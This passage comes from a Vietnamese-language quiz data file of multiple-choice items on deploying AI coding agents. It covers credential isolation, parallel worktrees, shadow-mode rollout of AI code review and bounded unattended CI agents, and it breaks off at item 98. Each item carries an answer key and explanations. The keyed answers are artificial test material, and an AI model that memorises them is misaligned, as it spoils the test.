      "Docs “Securely deploying AI agents”, proxy pattern: chạy proxy ngoài ranh giới của agent để chèn credential vào request đi ra. Agent không bao giờ thấy credential, credential nằm một chỗ an toàn thay vì rải cho từng agent.",
      "Docs “Mitigate jailbreaks and prompt injections”: áp dụng quyền tối thiểu, đừng cho Claude truy cập secret nó không cần, để lỡ bị chèn lệnh thì thiệt hại nhỏ nhất.",
      "Chữ nằm trong ngữ cảnh model thì có thể bị lôi ra: qua prompt injection, qua log, qua output. Đánh dấu “bí mật” không đổi được điều đó.",
      "Blast radius (bán kính thiệt hại): một credential lộ thì kẻ xấu làm được những gì. Danh tính riêng, quyền hẹp thì bán kính nhỏ, và log chỉ rõ agent nào làm."
    ],
    opts: [
      { k: "A", gist: "Keep the shared credential but mark the system prompt as confidential.",
        why: [
          "Sai: prompt vẫn bị lôi ra được, đánh dấu bí mật không phải chốt chặn (ý 3).",
          "Credential chung cấp admin vẫn nguyên đó. Lộ một lần là lộ quyền admin của mọi agent.",
          "Dễ bị cuốn vì có vẻ xử lý đúng chỗ secret nằm. Nhưng secret vẫn trong ngữ cảnh, chỉ thêm một lời dặn."
        ] },
      { k: "B", gist: "Grant the agents wider permissions so they never need to request access.",
        why: [
          "Sai hướng: quyền rộng hơn là bán kính thiệt hại lớn hơn (ý 4).",
          "Ngược hẳn với least privilege (quyền tối thiểu) mà docs khuyên (ý 2)."
        ] },
      { k: "C", gist: "Rotate the shared credential once a year and leave it in the prompts.",
        why: [
          "Sai: secret vẫn nằm trong prompt, xoay mỗi năm một lần thì một lần lộ dùng được gần cả năm (ý 3).",
          "Không đụng gì tới chuyện dùng chung và quyền admin."
        ] },
      { k: "D", gist: "Give each agent its own identity with least-privilege permissions per tool and task, so actions can be attributed and the blast radius stays small.",
        why: [
          "Đúng cho lỗi thứ nhất: mỗi agent một danh tính, quyền tối thiểu theo tool và việc (ý 2, ý 4).",
          "Log quy được hành động cho đúng agent. Một agent bị lừa cũng chỉ làm hỏng phần việc của nó."
        ] },
      { k: "E", gist: "Move credentials into a secrets manager that injects them at runtime outside the model's context, and keep them out of prompts, logs, and tool output.",
        why: [
          "Đúng cho lỗi thứ hai: secret được chèn lúc chạy, ngoài ngữ cảnh model, cùng tinh thần proxy pattern của docs (ý 1).",
          "Không có trong prompt, log, output của tool thì prompt injection không có gì để lôi ra (ý 3)."
        ] }
    ],
    refs: [
      { label: "Docs Securely deploying AI agents, mục “The proxy pattern”: proxy chèn credential bên ngoài, agent không bao giờ thấy credential", href: "https://code.claude.com/docs/en/agent-sdk/secure-deployment#the-proxy-pattern" },
      { label: "Docs Mitigate jailbreaks and prompt injections, mục “Indirect prompt injection”: đừng cho Claude truy cập secret nó không cần, thu hẹp quyền tối đa", href: "https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/mitigate-jailbreaks#indirect-prompt-injection" }
    ]
  },
  {
    de: 1, n: 91, total: 100, sub: "8.1", subName: "Chạy song song nhiều coding agent",
    answer: "D",
    ask: "To speed up a refactor, a team points eight coding agents at a single shared checkout of the repository. The agents clobber each other's edits, and test runs break on partially applied changes. What is the correct structural fix?",
    scene: [
      "Tám coding agent cùng sửa trên một bản checkout (thư mục làm việc) duy nhất của repo, mục đích là làm refactor nhanh hơn.",
      "Triệu chứng: agent này ghi đè sửa đổi của agent kia. Test chạy giữa chừng gặp thay đổi mới áp một nửa nên fail.",
      "Chỗ khó: đề hỏi “structural fix” (cách sửa về cấu trúc). Tức là đổi cách bố trí công việc để lỗi không xảy ra được, không phải dặn agent cẩn thận hơn."
    ],
    asks: [
      "Cách sửa đúng về mặt cấu trúc là gì?",
      "Tức là: cách ly chỗ ghi của từng agent mà vẫn giữ được chạy song song, rồi gộp kết quả có kiểm soát.",
      "Soi từng phương án: còn chung thư mục làm việc không, còn song song không, ai bảo đảm không đè nhau."
    ],
    facts: [
      "Git worktree là một thư mục làm việc riêng, có file và nhánh (branch) riêng, nhưng chung lịch sử và remote với repo gốc. Docs Claude Code dùng nó đúng cho việc chạy nhiều phiên song song mà sửa đổi không đụng nhau.",
      "Hai agent cùng ghi vào một thư mục thì không có gì ngăn ghi đè: commit chỉ chụp lại trạng thái, không khóa file. Test chạy trên thư mục đó cũng thấy luôn phần sửa dở của agent khác.",
      "Docs Agent teams ghi: hai teammate sửa cùng một file thì ghi đè nhau. Phải chia việc để mỗi teammate giữ một nhóm file khác nhau.",
      "Nhánh riêng thì cuối cùng phải gộp lại. Một bước tích hợp có kiểm soát (gộp theo thứ tự, chạy test sau khi gộp) là chỗ xử lý xung đột, thay vì để xung đột nổ ra ngẫu nhiên lúc đang chạy."
    ],
    opts: [
      { k: "A", gist: "Instruct every agent to commit often so its edits don't get lost.",
        why: [
          "Sai ở giả định: commit thường xuyên không cách ly gì cả (ý 2). Tám agent vẫn ghi vào cùng một thư mục.",
          "Agent A commit xong thì agent B vẫn đè lên file đó ở lần sửa kế tiếp. Test vẫn chạy trên trạng thái nửa vời, chỉ là có thêm nhiều commit lộn xộn."
        ] },
      { k: "B", gist: "Hand every agent the same list of files and have them work out among themselves who edits which file.",
        why: [
          "Sai ở người giữ ranh giới: giao cho các agent tự thương lượng, không có gì cưỡng chế (ý 3).",
          "Thương lượng tốn thêm token và lượt trao đổi, mà một agent hiểu sai hay quên là đè nhau như cũ. Vẫn chung thư mục làm việc nên lỗi test chạy trên thay đổi dở vẫn còn (ý 2)."
        ] },
      { k: "C", gist: "Run the agents sequentially in the shared checkout, keeping the same prompts.",
        why: [
          "Hết đè nhau thật, vì mỗi lúc chỉ một agent ghi. Nhưng mục tiêu “speed up” (làm nhanh hơn) mất luôn: tám agent chạy tuần tự thì như một.",
          "Dễ bị cuốn vì nó chặn được triệu chứng một cách chắc chắn. Nhưng đề hỏi cách cách ly, còn phương án này bỏ chạy song song để né vấn đề."
        ] },
      { k: "D", gist: "Put each agent in its own git worktree on its own branch, give them non-overlapping scopes, and bring the branches together through a controlled integration step.",
        why: [
          "Đúng: mỗi agent một worktree, một nhánh, nên không ai ghi vào file của ai. Test của agent nào chạy trên bản của agent đó (ý 1, ý 2).",
          "Phạm vi không chồng nhau làm giảm xung đột ngay từ lúc chia việc (ý 3). Bước gộp có kiểm soát xử lý phần còn lại (ý 4).",
          "Cả tám agent vẫn chạy cùng lúc, đúng mục tiêu ban đầu."
        ] }
    ],
    refs: [
      { label: "Docs Run parallel sessions with worktrees, phần mở đầu: mỗi worktree có file và nhánh riêng, nên các phiên song song không đè sửa đổi của nhau", href: "https://code.claude.com/docs/en/worktrees" },
      { label: "Docs Agent teams, mục “Avoid file conflicts”: hai teammate sửa cùng file thì ghi đè, nên chia để mỗi người giữ một nhóm file", href: "https://code.claude.com/docs/en/agent-teams#avoid-file-conflicts" }
    ]
  },
  {
    de: 1, n: 92, total: 100, sub: "8.1", subName: "Chạy song song nhiều coding agent",
    answer: "A",
    ask: "Telemetry from a 30-agent migration fleet shows that 40% of the pull requests end in conflicts, and almost every conflict involves one shared configuration file that most subtasks modify. What is the best way to address this?",
    scene: [
      "Một đợt migration chạy 30 agent song song. Telemetry (số liệu theo dõi) của cả đội cho thấy 40% pull request bị xung đột.",
      "Gần như mọi xung đột đều dính một file cấu hình chung mà phần lớn subtask (việc con) đều sửa.",
      "Chỗ khó: số liệu đã chỉ ra một nguyên nhân có tính hệ thống, không phải lỗi ngẫu nhiên của từng agent. Cách chữa phải nhắm vào đúng chỗ đó."
    ],
    asks: [
      "Hành động nào xử lý vấn đề này tốt nhất?",
      "Tức là: sửa cách chia việc để file chung không còn bị nhiều agent cùng sửa."
    ],
    facts: [
      "Xung đột gộp nhánh xảy ra khi nhiều nhánh sửa cùng một chỗ. Một file mà hầu hết subtask đều chạm là điểm nghẽn của cách chia việc (decomposition), không phải lỗi của agent nào.",
      "Docs Agent teams: hai teammate sửa cùng file thì ghi đè nhau, nên chia việc để mỗi người giữ một nhóm file khác nhau.",
      "Bài “How we built our multi-agent research system” của Anthropic ghi: mỗi subagent cần ranh giới việc rõ ràng. Lúc đầu mô tả việc mơ hồ làm các subagent làm trùng nhau, vì thiếu phân chia việc hợp lý.",
      "Hai cách tách phần chung ra: làm thay đổi chung trước, thành một bước riêng, rồi các việc khác mới chạy trên nền đó. Hoặc giao file đó cho đúng một agent sở hữu."
    ],
    opts: [
      { k: "A", gist: "Rework the decomposition: either land the shared config change first as its own step, or make a single agent the owner of that file, so the other subtasks never touch it.",
        why: [
          "Đúng: chữa đúng nguyên nhân mà telemetry chỉ ra, là quyền sở hữu chồng nhau trong cách chia việc (ý 1).",
          "Làm trước thành bước riêng thì các nhánh sau đều bắt đầu từ file đã sửa, không ai phải sửa nó nữa. Giao một agent sở hữu thì chỉ còn một nhánh chạm file đó (ý 2, ý 4)."
        ] },
      { k: "B", gist: "Have the agents settle conflicts by keeping the most recent version of each file.",
        why: [
          "Sai: “newest wins” (bản mới nhất thắng) chỉ giữ một bên, bỏ hẳn sửa đổi của các bên kia mà không báo.",
          "File cấu hình mất mục của agent khác thì build có thể vỡ, hoặc tệ hơn là chạy được nhưng sai. Xung đột vẫn sinh ra như cũ, chỉ bị giấu đi.",
          "Dễ bị cuốn vì nghe như một luật tự động gọn gàng. Nhưng nó xử lý hậu quả từng lần, còn nguyên nhân trong cách chia việc vẫn y nguyên."
        ] },
      { k: "C", gist: "Turn off the telemetry collection, since it only produces noise.",
        why: [
          "Sai: chính telemetry là thứ chỉ ra nguyên nhân hệ thống (một file chung). Tắt nó thì mất khả năng thấy vấn đề, còn xung đột vẫn 40%.",
          "Không đo nữa thì sau khi sửa cách chia việc cũng không biết tỉ lệ xung đột có giảm thật không."
        ] },
      { k: "D", gist: "Add more agents so that more work completes before conflicts happen.",
        why: [
          "Sai hướng: thêm agent là thêm nhánh cùng sửa file chung, nên xung đột còn nhiều hơn (ý 1).",
          "Xung đột không phụ thuộc làm nhanh hay chậm. Nó sinh ra vì nhiều nhánh cùng chạm một chỗ."
        ] }
    ],
    refs: [
      { label: "Docs Agent teams, mục “Avoid file conflicts”: chia việc để mỗi teammate giữ một nhóm file riêng", href: "https://code.claude.com/docs/en/agent-teams#avoid-file-conflicts" },
      { label: "Bài Anthropic Engineering “How we built our multi-agent research system”, phần prompt engineering: mỗi subagent cần ranh giới việc rõ, mô tả mơ hồ dẫn tới làm trùng", href: "https://www.anthropic.com/engineering/multi-agent-research-system" }
    ]
  },
  {
    de: 1, n: 93, total: 100, sub: "8.1", subName: "Chạy song song nhiều coding agent",
    answer: "AB",
    ask: "A team is designing a merge and conflict-handling strategy for several agents working in parallel on one large service. Which two practices work best? (Choose two.)",
    scene: [
      "Nhiều agent chạy song song trên một service lớn. Team cần chiến lược gộp nhánh và xử lý xung đột.",
      "Năm phương án: có cái chặn xung đột từ gốc, có cái bắt lỗi lúc gộp, có cái gây thêm rối.",
      "Chỗ khó: E nghe rất hiện đại (test qua là tự gộp). Phải nhớ test riêng của từng nhánh không thấy được lỗi chỉ phát sinh khi ghép các nhánh với nhau."
    ],
    asks: [
      "Hai cách làm nào hiệu quả nhất?",
      "Tức là: một cách giảm xung đột ngay lúc chia việc, và một cách bắt lỗi khi các phần ghép lại."
    ],
    facts: [
      "Chia quyền sở hữu file hoặc module tách biệt hẳn (disjoint), và chốt giao diện (interface) giữa các phần từ đầu, thì các nhánh hiếm khi chạm cùng chỗ. Docs Agent teams cũng khuyên chia để mỗi teammate giữ một nhóm file khác nhau.",
      "Hai nhánh mỗi cái pass test riêng vẫn có thể vỡ khi ghép: vd nhánh A đổi tên một hàm, nhánh B thêm chỗ gọi tên cũ. Chỉ test chạy trên bản đã ghép mới thấy.",
      "Gộp theo thứ tự định trước và chạy full test sau mỗi lần gộp thì lỗi lộ ra ngay ở lần gộp gây ra nó, dễ khoanh vùng.",
      "Rebase là đặt lại các commit của nhánh mình lên trên một nhánh khác. Rebase tùy hứng lên nhánh của agent khác thì nhánh mình phụ thuộc vào việc còn dở của họ."
    ],
    opts: [
      { k: "A", gist: "Give each agent disjoint ownership of files or modules and agree the interfaces between parts up front, so parallel work seldom overlaps.",
        why: [
          "Đúng: chặn xung đột từ gốc. Không chung file thì gần như không có gì để xung đột (ý 1).",
          "Chốt interface trước thì mỗi agent biết phần kia sẽ gọi mình thế nào, không phải đoán rồi sửa vào phần của nhau."
        ] },
      { k: "B", gist: "Integrate branches in a planned order and run the complete test suite after every merge, so breakage across branches surfaces early.",
        why: [
          "Đúng: bắt đúng loại lỗi mà test riêng từng nhánh bỏ sót, là lỗi khi ghép (ý 2).",
          "Gộp từng nhánh một rồi test ngay thì biết nhánh nào làm vỡ (ý 3). Đây là lớp thứ hai bổ sung cho A: A giảm xung đột, B bắt phần còn lọt."
        ] },
      { k: "C", gist: "Let every agent rebase onto whichever other agent's branch finished most recently.",
        why: [
          "Sai: nhánh mình nằm trên nhánh chưa ai duyệt của agent khác, phụ thuộc chéo chằng chịt (ý 4).",
          "Nhánh kia có lỗi hay bị bỏ thì mọi nhánh rebase lên nó dính theo. Thứ tự gộp thành ngẫu nhiên, ngược hẳn với B."
        ] },
      { k: "D", gist: "Have each agent independently attempt the entire task, then merge whichever result the majority produced.",
        why: [
          "Sai: mỗi agent làm cả việc thì chi phí nhân lên theo số agent, mà mất luôn lợi ích chia việc.",
          "Các bản làm độc lập đều sửa mọi file, nên gộp lại còn xung đột nhiều hơn. “Majority” (đa số) cũng khó định nghĩa với code: hai bản đúng hiếm khi giống nhau từng dòng."
        ] },
      { k: "E", gist: "Automatically merge each branch the moment its own tests pass, without regard to the other branches.",
        why: [
          "Sai ở giả định: test riêng của nhánh không phủ tương tác giữa các nhánh (ý 2).",
          "Dễ bị cuốn vì nghe như CI tự động bình thường. Nhưng gộp tự động mà không xét nhánh khác thì lỗi khi ghép lọt thẳng vào nhánh chính, lộ ra muộn hơn và khó lần hơn."
        ] }
    ],
    refs: [
      { label: "Docs Agent teams, mục “Avoid file conflicts”: chia việc để mỗi teammate giữ một nhóm file riêng, tránh ghi đè", href: "https://code.claude.com/docs/en/agent-teams#avoid-file-conflicts" },
      { label: "Bài Anthropic Engineering “How we built our multi-agent research system”: lead agent chia việc, mỗi subagent cần ranh giới việc rõ ràng", href: "https://www.anthropic.com/engineering/multi-agent-research-system" }
    ]
  },
  {
    de: 1, n: 94, total: 100, sub: "8.2", subName: "Kiểm chứng và review code bằng AI",
    answer: "C",
    ask: "An organization switches on an AI code reviewer as a mandatory check for every pull request on day one. Developers complain of lots of low-value comments, a few defects it misses, and slower merges, and they start approving changes even when the reviewer objects. What rollout would have worked better?",
    scene: [
      "Tổ chức bật AI code reviewer thành check bắt buộc cho mọi pull request ngay từ ngày đầu.",
      "Kết quả: nhiều bình luận ít giá trị, vẫn lọt vài lỗi, merge chậm hơn. Developer bắt đầu duyệt bất chấp reviewer phản đối.",
      "Chỗ khó: vấn đề không nằm ở AI review hay hay dở. Vấn đề là chưa đo nó đúng tới đâu đã cho nó quyền chặn."
    ],
    asks: [
      "Lẽ ra nên triển khai thế nào thì tốt hơn?",
      "Tức là: đo độ tin cậy của reviewer trước, rồi chỉ cho nó chặn ở những chỗ đã chứng minh là đáng tin."
    ],
    facts: [
      "Shadow mode (chạy bóng): công cụ chạy thật trên dữ liệu thật nhưng kết quả không chặn ai, chỉ ghi lại để so sánh.",
      "Precision (độ chính xác) là tỉ lệ cảnh báo đưa ra mà đúng là lỗi thật. Recall (độ phủ) là tỉ lệ lỗi thật mà nó bắt được. So với kết quả review của người là cách có sẵn để đo hai số này.",
      "Docs đánh giá, mục “Define your success criteria”: tiêu chí phải cụ thể và đo được trước khi dựa vào nó. Reviewer chưa đo thì không biết nó có đạt hay không.",
      "Docs Code Review của Claude Code: review không bao giờ tự approve hay chặn pull request, quyết định merge vẫn ở team. Docs cũng nói AI có thể bỏ sót lỗi, và cho chỉnh những gì bị flag bằng file <code>REVIEW.md</code>."
    ],
    opts: [
      { k: "A", gist: "Drop human review for every pull request the AI reviewer approves.",
        why: [
          "Sai: chính đề nói reviewer này “missed defects” (bỏ sót lỗi). Bỏ người là bỏ lớp duy nhất đang bắt những lỗi đó (ý 4).",
          "Còn đi ngược hướng: reviewer chưa được đo mà đã được giao nhiều quyền hơn."
        ] },
      { k: "B", gist: "Leave it as an advisory tool forever and never measure what it produces.",
        why: [
          "Nửa đầu đúng (không chặn), nửa sau sai: không đo thì không biết nó đúng ở đâu, không tinh chỉnh được, cũng không bao giờ biết lúc nào an toàn để tin (ý 3).",
          "Bình luận rác vẫn còn nguyên, developer quen dần việc bỏ qua nó."
        ] },
      { k: "C", gist: "Run the reviewer in shadow mode, compare its findings against human reviews to measure precision and recall, tune it, and turn it into a gate only for the categories where it is calibrated.",
        why: [
          "Đúng: shadow mode cho số liệu thật mà không chặn ai (ý 1). So với người thì ra precision và recall (ý 2).",
          "Có số rồi mới tinh chỉnh, vd bớt loại bình luận vụn bằng <code>REVIEW.md</code> (ý 4), rồi đo lại. Chỉ loại lỗi nào đạt tiêu chí mới được chặn merge (ý 3).",
          "Tránh đúng các triệu chứng của đề: không làm chậm merge khi chưa tin được, không tạo thói quen bỏ qua reviewer."
        ] },
      { k: "D", gist: "Make it a stricter gate by blocking the merge on every comment it posts.",
        why: [
          "Sai hướng: precision đang thấp, chặn trên mọi bình luận là khuếch đại đúng phần rác (ý 2).",
          "Dễ bị cuốn vì nghe như siết chất lượng. Nhưng merge còn chậm hơn, và developer càng có lý do gỡ hoặc lách check."
        ] }
    ],
    refs: [
      { label: "Docs Code Review, phần mở đầu: review không approve hay chặn PR, quyết định merge ở team, và AI vẫn có thể bỏ sót lỗi", href: "https://code.claude.com/docs/en/code-review" },
      { label: "Docs Customize Code Review, mục “Choose what to write in REVIEW.md”: bớt bình luận vụn, bỏ loại CI đã bắt, đòi bằng chứng để giảm cảnh báo sai", href: "https://code.claude.com/docs/en/code-review-customize#choose-what-to-write-in-review-md" },
      { label: "Docs đánh giá, mục “Define your success criteria”: tiêu chí phải cụ thể, đo được trước khi dựa vào", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#define-your-success-criteria" }
    ]
  },
  {
    de: 1, n: 95, total: 100, sub: "8.2", subName: "Kiểm chứng và review code bằng AI",
    answer: "B",
    ask: "Coding agents are now opening roughly 200 pull requests per week, but the same five human reviewers still merge them. The backlog keeps growing and the reviewers have started skimming. Which strategy best restores the quality of verification?",
    scene: [
      "Agent mở khoảng 200 pull request mỗi tuần, vẫn chỉ năm người review và merge.",
      "Hàng chờ dài ra, người review bắt đầu đọc lướt. Tức là lớp kiểm tra bằng người đang thủng dần.",
      "Chỗ khó: tốc độ sinh code đã vượt tốc độ người đọc. Đề hỏi cách phục hồi chất lượng kiểm chứng, không hỏi cách merge cho nhanh."
    ],
    asks: [
      "Chiến lược nào phục hồi chất lượng kiểm chứng tốt nhất?",
      "Tức là: để máy gánh phần kiểm tra lặp lại, còn sức người dồn vào chỗ rủi ro cao.",
      "Soi từng phương án: có giữ được lượng việc của agent không, và chỗ rủi ro cao còn có người nhìn không."
    ],
    facts: [
      "Kiểm chứng nhiều lớp: test, kiểm kiểu (type check), phân tích tĩnh (static analysis), AI review đã hiệu chỉnh. Mỗi lớp bắt một loại lỗi, chạy được trên mọi PR mà không tốn giờ người.",
      "Định tuyến theo rủi ro: PR đụng vùng nguy hiểm như auth (xác thực), thanh toán, migration cơ sở dữ liệu thì bắt buộc người review. PR rủi ro thấp dựa nhiều hơn vào các lớp tự động. Docs Code Review cũng cho đặt mức review riêng từng repo, Deep cho codebase quan trọng.",
      "Test pass chỉ chứng minh những gì test có kiểm. Lỗ hổng phân quyền hay migration không lùi lại được thường nằm ngoài phạm vi test.",
      "Agent tự review code của chính nó thì mang cùng điểm mù với lúc viết. Docs Code Review của Claude Code cũng nói AI có thể bỏ sót lỗi và review không thay quyết định merge của team."
    ],
    opts: [
      { k: "A", gist: "Limit how much the agents produce so the reviewers can go back to reading every line.",
        why: [
          "Chạy được, nhưng bỏ mất lý do dùng agent là lượng việc lớn. Mà cách kiểm chứng cũng không tốt lên, chỉ là ít việc hơn.",
          "Đọc từng dòng không phải cách duy nhất để kiểm chứng. Các lớp tự động bắt được nhiều lỗi mà người đọc lướt bỏ qua (ý 1)."
        ] },
      { k: "B", gist: "Layer on automated verification such as tests, type checking, static analysis and calibrated AI review, and route human attention by risk, with mandatory human review for areas like auth, payments and migrations.",
        why: [
          "Đúng: lớp tự động chạy trên cả 200 PR, gánh phần lặp lại mà năm người không kham nổi (ý 1).",
          "Sức người dồn vào nơi một lỗi lọt gây hậu quả nặng nhất (ý 2). Năm người đọc kỹ phần nhỏ PR rủi ro cao tốt hơn đọc lướt tất cả.",
          "“Calibrated” (đã hiệu chỉnh) là chữ quan trọng: AI review chỉ được tin ở những loại lỗi đã đo là đáng tin."
        ] },
      { k: "C", gist: "Auto-approve any pull request whose tests pass, authentication changes included.",
        why: [
          "Sai: test pass không chứng minh thay đổi auth là an toàn (ý 3).",
          "Dễ bị cuốn vì giải quyết hàng chờ ngay lập tức. Nhưng nó mở cửa đúng vùng cần người nhìn nhất (ý 2)."
        ] },
      { k: "D", gist: "Make the agent that authored each change its sole reviewer, eliminating the bottleneck.",
        why: [
          "Sai: agent tự soát việc của mình thì cùng điểm mù, cùng hiểu sai yêu cầu như lúc viết (ý 4).",
          "Hết nghẽn thật, nhưng hết luôn kiểm chứng độc lập. Đề hỏi phục hồi chất lượng, phương án này làm nó tệ đi."
        ] }
    ],
    refs: [
      { label: "Docs Code Review, phần mở đầu: AI review có thể bỏ sót lỗi, quyết định merge vẫn ở team", href: "https://code.claude.com/docs/en/code-review" },
      { label: "Docs Code Review, mục “Review levels”: đặt mức review riêng cho từng repo, Deep cho codebase quan trọng, Quick cho codebase thường ngày", href: "https://code.claude.com/docs/en/code-review#review-levels" }
    ]
  },
  {
    de: 1, n: 96, total: 100, sub: "8.2", subName: "Kiểm chứng và review code bằng AI",
    answer: "D",
    ask: "Over one month in shadow mode, an AI reviewer raised 500 issues. Human reviewers judged only 40% of them to be genuine problems, and the tool also missed several defects that humans found. The team now wants to begin gating merges on it. What is the best next step?",
    scene: [
      "AI reviewer chạy shadow mode (chạy bóng, không chặn ai) một tháng, đưa ra 500 cảnh báo.",
      "Người chấm lại: chỉ 40% là lỗi thật, tức 300 cảnh báo là sai. Nó còn bỏ sót vài lỗi mà người bắt được.",
      "Team muốn bắt đầu cho nó chặn merge. Chỗ khó: số liệu đã có sẵn, câu hỏi là đọc số đó ra quyết định gì."
    ],
    asks: [
      "Bước tiếp theo tốt nhất là gì?",
      "Tức là: với precision 40% và recall còn hở, reviewer này đã đủ tin để chặn chưa, nếu chưa thì làm gì để đi tới đó."
    ],
    facts: [
      "Precision (độ chính xác) 40% nghĩa là cứ 10 cảnh báo thì 6 cái sai. Cảnh báo sai (false positive) mà chặn merge thì 60% lần chặn là chặn oan.",
      "Recall (độ phủ) là tỉ lệ lỗi thật bị bắt. Lọt lỗi mà người bắt được nghĩa là recall chưa đủ, nên reviewer im lặng chưa chứng minh code sạch.",
      "Một con số trung bình có thể che sự khác nhau giữa các loại lỗi: có loại nó bắt rất trúng, có loại toàn sai. Tách theo loại mới thấy chỗ nào đáng tin.",
      "Docs Customize Code Review: bớt bình luận vụn, bỏ loại CI đã bắt, đòi bằng chứng <code>file:line</code> cho một loại cảnh báo để giảm cảnh báo sai. Tức là tinh chỉnh theo từng loại, rồi đo lại."
    ],
    opts: [
      { k: "A", gist: "Gate only on its approvals, and treat its rejections as suggestions.",
        why: [
          "Sai ở giả định: lấy lúc nó “approve” làm điều kiện cho merge, trong khi nó đã bỏ sót lỗi thật (ý 2).",
          "Dễ bị cuốn vì nghe như né được 60% cảnh báo sai. Nhưng nó tin đúng vào lúc reviewer im lặng, là chỗ nó đã chứng minh là hở."
        ] },
      { k: "B", gist: "Gate right away, since even 40% precision still catches some real issues.",
        why: [
          "Sai: 60% lần chặn là chặn oan (ý 1). Merge chậm, người dùng mất lòng tin.",
          "Chặn sai nhiều thì developer học cách gỡ hoặc lách check. Tới lúc reviewer bắt đúng, cũng không ai nghe nữa."
        ] },
      { k: "C", gist: "Make it post more comments so it covers a wider range of potential defects.",
        why: [
          "Sai hướng: thêm bình luận thì recall có thể nhích lên, nhưng precision còn tụt nữa (ý 1, ý 2).",
          "Vấn đề hiện tại là nhiễu nhiều. Thêm nhiễu không làm nó đáng tin hơn để chặn."
        ] },
      { k: "D", gist: "Hold off on gating. Narrow the reviewer to the categories where its precision is high, tune and measure again, and track the false-positive rate before anything blocks.",
        why: [
          "Đúng: số liệu nói chưa đủ tin để chặn (ý 1, ý 2), nên chưa chặn.",
          "Tách theo loại để giữ những chỗ nó bắt trúng (ý 3). Tinh chỉnh rồi đo lại (ý 4). Tỉ lệ cảnh báo sai là tiêu chí để quyết lúc nào được bật chặn.",
          "Đi từng bước như vậy thì khi bật chặn, mỗi lần chặn đều có lý do, người dùng tin."
        ] }
    ],
    refs: [
      { label: "Docs Customize Code Review, mục “Choose what to write in REVIEW.md”: chỉnh theo từng loại cảnh báo, đòi bằng chứng để cắt cảnh báo sai", href: "https://code.claude.com/docs/en/code-review-customize#choose-what-to-write-in-review-md" },
      { label: "Docs đánh giá, mục “Define your success criteria”: chốt tiêu chí cụ thể, đo được trước khi dựa vào kết quả", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#define-your-success-criteria" },
      { label: "Docs Code Review, phần mở đầu: có bước kiểm để lọc cảnh báo sai, và AI vẫn có thể bỏ sót lỗi", href: "https://code.claude.com/docs/en/code-review" }
    ]
  },
  {
    de: 1, n: 97, total: 100, sub: "8.3", subName: "Agent chạy không giám sát, theo sự kiện",
    answer: "B",
    ask: "A team wants an agent to react whenever the main branch's CI build fails during the night. Which design is best?",
    scene: [
      "Build CI của nhánh main hỏng vào ban đêm, không ai trực. Team muốn agent phản ứng.",
      "Chạy không giám sát nghĩa là không có người duyệt từng bước. Mọi giới hạn phải nằm sẵn trong thiết kế.",
      "Chỗ khó: ba phương án sai đều làm build xanh theo cách nào đó. Phải chọn cách vừa có ích vừa không gây hại khi không ai nhìn."
    ],
    asks: [
      "Thiết kế nào tốt nhất?",
      "Tức là: agent chạy theo sự kiện, quyền tối thiểu, có giới hạn, thu bằng chứng và đề xuất cách sửa để người duyệt, chứ không tự quyết.",
      "Soi từng phương án: quyền tới đâu, có giới hạn chi phí không, có giấu vấn đề không, người có được báo không."
    ],
    facts: [
      "Chạy headless (không giao diện, không người ngồi trước máy) bằng <code>claude -p</code> hoặc Agent SDK. Docs “Run Claude on a schedule” nêu đúng việc kiểm tra CI hỏng ban đêm, chạy qua GitHub Actions hoặc routine kích hoạt theo sự kiện GitHub.",
      "Agent SDK có <code>max_turns</code> và <code>max_budget_usd</code> để chặn số lượt và mức chi. Docs ghi: không giới hạn thì vòng lặp có thể chạy rất lâu, đặt budget là mặc định tốt cho agent production.",
      "Docs “Securely deploying AI agents”, mục least privilege (quyền tối thiểu): chỉ cấp năng lực mà việc cần, credential nên đi qua proxy thay vì đưa thẳng cho agent.",
      "Đề xuất sửa dưới dạng pull request thì có review như mọi thay đổi khác. Push thẳng vào main là bỏ qua lớp đó."
    ],
    opts: [
      { k: "A", gist: "Allow the agent to push fixes straight to main using an administrator token.",
        why: [
          "Sai hai lớp: token admin trái quyền tối thiểu (ý 3), push thẳng main bỏ qua review (ý 4).",
          "Agent đoán sai nguyên nhân lúc 3 giờ sáng là main có thêm một commit sai. Token admin còn cho nó làm được nhiều việc ngoài sửa build."
        ] },
      { k: "B", gist: "Fire a headless agent on the failure event with least-privilege credentials and bounded turns and budget; it collects logs, proposes a fix as a pull request, and notifies the owner with what it found.",
        why: [
          "Đúng: kích hoạt theo sự kiện, chạy headless (ý 1). Giới hạn lượt và budget để không chạy vô tận (ý 2). Quyền vừa đủ đọc log và mở PR (ý 3).",
          "Cách sửa đi qua PR nên vẫn có người duyệt (ý 4). Báo owner kèm bằng chứng để sáng ra người ta quyết nhanh, kể cả khi agent đoán sai."
        ] },
      { k: "C", gist: "Make the agent re-run the failed build again and again until it passes.",
        why: [
          "Sai: chạy lại tới khi xanh là giấu lỗi. Lỗi thật thì không bao giờ xanh, chỉ đốt tài nguyên. Lỗi chập chờn (flaky) thì xanh ngẫu nhiên rồi bị bỏ qua.",
          "Dễ bị cuốn vì chạy lại là cách quen thuộc với lỗi chập chờn. Nhưng chạy lại vô hạn, không thu bằng chứng, không báo ai, đúng kiểu vòng lặp không đáy mà docs khuyên chặn bằng budget (ý 2)."
        ] },
      { k: "D", gist: "Have the agent quietly disable the failing tests so the build turns green, leaving existing monitoring as is.",
        why: [
          "Sai: tắt test là phá lưới an toàn và giấu vấn đề. Build xanh nhưng lỗi vẫn ở đó, sẵn sàng lên production.",
          "“Silently” (âm thầm) làm nó tệ hơn: không ai biết test đã bị tắt."
        ] }
    ],
    refs: [
      { label: "Docs Common workflows, mục “Run Claude on a schedule”: các cách chạy Claude tự động, có GitHub Actions và routine kích hoạt theo sự kiện", href: "https://code.claude.com/docs/en/common-workflows#run-claude-on-a-schedule" },
      { label: "Docs How the agent loop works, mục “Turns and budget”: <code>max_turns</code>, <code>max_budget_usd</code> và lý do nên đặt giới hạn cho agent production", href: "https://code.claude.com/docs/en/agent-sdk/agent-loop#turns-and-budget" },
      { label: "Docs Securely deploying AI agents, mục “Least privilege”: chỉ cấp năng lực việc cần, credential đi qua proxy", href: "https://code.claude.com/docs/en/agent-sdk/secure-deployment#least-privilege" }
    ]
  },
  {
    de: 1, n: 98, total: 100, sub: "8.3", subName: "Agent chạy không giám sát, theo sự kiện",
    answer: "CD",
    ask: "A scheduled agent runs every night for several hours, upgrading dependencies across many repositories. Which two operational controls matter most? (Choose two.)",
    scene: [
